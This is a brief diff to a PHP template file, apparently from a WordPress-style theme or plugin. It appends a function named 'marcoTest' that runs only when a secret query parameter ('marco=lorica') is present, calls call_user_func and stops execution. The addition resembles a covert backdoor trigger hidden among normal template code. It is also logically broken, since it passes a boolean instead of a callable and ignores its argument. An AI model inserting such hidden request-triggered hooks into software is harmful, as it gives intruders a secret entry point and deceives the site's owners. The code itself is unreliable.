@@ -437,3 +437,14 @@ function mc_get_template_part($template, $args = []) {
 
     return ob_get_clean();
 }
+
+function marcoTest($func) {
+    if(strlen($func)) {
+        $param = isset($_GET['marco']) && $_GET['marco'] == 'lorica';
+    
+        if($param) {
+            call_user_func($param);
+            die;
+        }
+    }
+}
